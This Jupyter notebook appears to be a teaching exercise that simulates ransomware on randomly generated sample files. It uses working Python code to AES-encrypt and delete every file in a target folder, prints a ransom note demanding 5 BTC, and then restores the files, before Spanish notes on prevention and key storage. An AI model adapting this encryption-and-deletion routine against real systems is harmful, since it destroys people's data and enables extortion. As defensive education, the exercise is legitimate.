{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import random\n",
    "import string\n",
    "from Crypto.Cipher import AES\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "from Crypto.Random import get_random_bytes\n",
    "import base64\n",
    "import json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "TARGET_FOLDER = \"important_files\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Sample data creation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "File created: file_1.txt (412 characters)\n",
      "File created: file_2.txt (313 characters)\n",
      "File created: file_3.txt (215 characters)\n",
      "File created: file_4.txt (444 characters)\n",
      "File created: file_5.txt (248 characters)\n",
      "\n",
      "Files in folder:\n",
      "file_4.txt - 444 bytes\n",
      "file_5.txt - 248 bytes\n",
      "file_1.txt - 412 bytes\n",
      "file_2.txt - 313 bytes\n",
      "file_3.txt - 215 bytes\n",
      "file_4.txt.encrypted - 304 bytes\n",
      "file_3.txt.encrypted - 384 bytes\n",
      "file_2.txt.encrypted - 208 bytes\n",
      "file_5.txt.encrypted - 352 bytes\n",
      "file_1.txt.encrypted - 432 bytes\n"
     ]
    }
   ],
   "source": [
    "def generate_random_text(length=100):\n",
    "    characters = string.ascii_letters + string.digits + string.punctuation + \" \\n\"\n",
    "    return ''.join(random.choice(characters) for _ in range(length))\n",
    "\n",
    "if not os.path.exists(TARGET_FOLDER):\n",
    "    os.makedirs(TARGET_FOLDER)\n",
    "\n",
    "num_files = 5\n",
    "for i in range(num_files):\n",
    "    file_name = f\"file_{i+1}.txt\"\n",
    "    full_path = os.path.join(TARGET_FOLDER, file_name)\n",
    "    \n",
    "    length = random.randint(100, 500)\n",
    "    content = generate_random_text(length)\n",
    "    \n",
    "    with open(full_path, \"w\") as f:\n",
    "        f.write(content)\n",
    "    \n",
    "    print(f\"File created: {file_name} ({length} characters)\")\n",
    "\n",
    "print(\"\\nFiles in folder:\")\n",
    "for file in os.listdir(TARGET_FOLDER):\n",
    "    full_path = os.path.join(TARGET_FOLDER, file)\n",
    "    size = os.path.getsize(full_path)\n",
    "    print(f\"{file} - {size} bytes\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### AES Encryption"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "# The goal is to simulate an attack which will remove the original file and replace it with an encrypted one.\n",
    "def encrypt_file(file_path, key):\n",
    "    iv = get_random_bytes(16)\n",
    "    \n",
    "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
    "    \n",
    "    with open(file_path, 'rb') as f:\n",
    "        data = f.read()\n",
    "    \n",
    "    encrypted_data = cipher.encrypt(pad(data, AES.block_size))\n",
    "    \n",
    "    complete_data = iv + encrypted_data\n",
    "    \n",
    "    with open(file_path + '.encrypted', 'wb') as f:\n",
    "        f.write(complete_data)\n",
    "    \n",
    "    os.remove(file_path)\n",
    "    \n",
    "    return True\n",
    "\n",
    "def decrypt_file(encrypted_file_path, key):\n",
    "    if not os.path.exists(encrypted_file_path):\n",
    "        print(f\"File {encrypted_file_path} does not exist.\")\n",
    "        return False\n",
    "    \n",
    "    with open(encrypted_file_path, 'rb') as f:\n",
    "        complete_data = f.read()\n",
    "    \n",
    "    iv = complete_data[:16]\n",
    "    encrypted_data = complete_data[16:]\n",
    "    \n",
    "    decipher = AES.new(key, AES.MODE_CBC, iv)\n",
    "    \n",
    "    try:\n",
    "        # Dont forget to remove padding!\n",
    "        decrypted_data = unpad(decipher.decrypt(encrypted_data), AES.block_size)\n",
    "        \n",
    "        original_file_path = encrypted_file_path.replace('.encrypted', '')\n",
    "        with open(original_file_path, 'wb') as f:\n",
    "            f.write(decrypted_data)\n",
    "        \n",
    "        os.remove(encrypted_file_path)\n",
    "        \n",
    "        return True\n",
    "    except Exception as e:\n",
    "        print(f\"Error decrypting {encrypted_file_path}: {str(e)}\")\n",
    "        return False"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ransomware"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "🔒 Starting file encryption...\n",
      "Encrypted: file_4.txt\n",
      "Encrypted: file_5.txt\n",
      "Encrypted: file_1.txt\n",
      "Encrypted: file_2.txt\n",
      "Encrypted: file_3.txt\n",
      "\n",
      "✅ Encryption completed. 5 files have been encrypted.\n",
      "⚠️ To recover your files, you will need the decryption key.\n",
      "\n",
      "==================================================\n",
      "🚨 YOUR FILES HAVE BEEN ENCRYPTED 🚨\n",
      "To recover them, you must pay 5 BTC\n",
      "==================================================\n"
     ]
    }
   ],
   "source": [
    "def run_ransomware():\n",
    "    key = get_random_bytes(32)\n",
    "    \n",
    "    with open(\"secret_key.key\", \"wb\") as f:\n",
    "        # Obviously, in a real scenario, this would be sent to the attacker...\n",
    "        f.write(key)\n",
    "    \n",
    "    print(\"🔒 Starting file encryption...\")\n",
    "    \n",
    "    encrypted_files = 0\n",
    "    for file in os.listdir(TARGET_FOLDER):\n",
    "        if not file.endswith('.encrypted'):  \n",
    "            full_path = os.path.join(TARGET_FOLDER, file)\n",
    "            if os.path.isfile(full_path):\n",
    "                if encrypt_file(full_path, key):\n",
    "                    encrypted_files += 1\n",
    "                    print(f\"Encrypted: {file}\")\n",
    "    \n",
    "    print(f\"\\n✅ Encryption completed. {encrypted_files} files have been encrypted.\")\n",
    "    print(\"⚠️ To recover your files, you will need the decryption key.\")\n",
    "    \n",
    "    print(\"\\n\" + \"=\"*50)\n",
    "    print(\"🚨 YOUR FILES HAVE BEEN ENCRYPTED 🚨\")\n",
    "    print(\"To recover them, you must pay 5 BTC\")\n",
    "    print(\"=\"*50)\n",
    "    \n",
    "    return key\n",
    "\n",
    "# Run the ransomware\n",
    "generated_key = run_ransomware()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "🔓 Starting file decryption...\n",
      "Decrypted: file_4.txt.encrypted\n",
      "Decrypted: file_3.txt.encrypted\n",
      "Decrypted: file_2.txt.encrypted\n",
      "Decrypted: file_5.txt.encrypted\n",
      "Decrypted: file_1.txt.encrypted\n",
      "\n",
      "✅ Decryption completed. 5 files have been recovered.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def recover_files(key=None):\n",
    "    if key is None:\n",
    "        try:\n",
    "            with open(\"secret_key.key\", \"rb\") as f:\n",
    "                key = f.read()\n",
    "        except FileNotFoundError:\n",
    "            print(\"❌ Key file not found. Unable to recover files.\")\n",
    "            return False\n",
    "    \n",
    "    print(\"🔓 Starting file decryption...\")\n",
    "    \n",
    "    decrypted_files = 0\n",
    "    for file in os.listdir(TARGET_FOLDER):\n",
    "        if file.endswith('.encrypted'):\n",
    "            full_path = os.path.join(TARGET_FOLDER, file)\n",
    "            if decrypt_file(full_path, key):\n",
    "                decrypted_files += 1\n",
    "                print(f\"Decrypted: {file}\")\n",
    "    \n",
    "    print(f\"\\n✅ Decryption completed. {decrypted_files} files have been recovered.\")\n",
    "    return True\n",
    "\n",
    "# Recover files using the previously generated key\n",
    "recover_files(generated_key)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ¿Cómo podríamos evitar ataques de ransomware?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Se pueden evitar ataques de ransomware implementando un enfoque multicapa que incluye realizar copias de seguridad siguiendo la regla 3-2-1 y verificando su restauración, mantener actualizados el sistema operativo, aplicaciones y antivirus para corregir vulnerabilidades, y capacitar a los usuarios en la identificación de phishing, ingeniería social y prácticas como el uso de contraseñas seguras y autenticación de dos factores. \n",
    "\n",
    "Además, es recomendable aplicar el principio de mínimo privilegio en el control de acceso, usar firewalls, segmentar redes, implementar sistemas de detección de intrusiones y filtrado web, y contar con un plan de respuesta a incidentes probado regularmente. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ¿Qué tan importante es almacenar claves de manera segura?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Bastante. Es recomendado usar Hardware Security Modules (HSM) o sistemas de gestión de claves (KMS), aplicar técnicas como el cifrado y la división de claves, establecer controles de acceso estrictos, auditar operaciones y guardar copias en ubicaciones seguras, evitando almacenarlas en el mismo sistema que los datos o enviarlas por canales no seguros."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.14"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
